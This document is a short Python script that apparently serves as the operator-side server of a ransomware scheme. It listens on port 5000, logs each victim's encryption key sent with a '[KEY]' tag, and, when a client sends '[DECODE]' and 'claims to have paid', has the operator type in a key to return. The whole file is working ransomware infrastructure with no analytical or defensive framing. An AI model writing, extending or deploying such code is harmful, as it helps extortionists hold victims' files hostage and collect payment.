import socket

addr = ('', 5000)
skt = socket.socket()
skt.bind(addr)

while True:
    skt.listen(1)
    conn, address = skt.accept()
    print(address[0] + ' just connected!')

    cmd = conn.recv(1024).decode()

    if cmd.startswith('[KEY]'):
        print('The key for this client is ' + cmd.split('[KEY]')[1])
    elif cmd == '[DECODE]':
        print('This client claims to have paid')
        key = input('Key: ').encode()
        conn.send(key)
                    
        conn.close()
        break

skt.close()
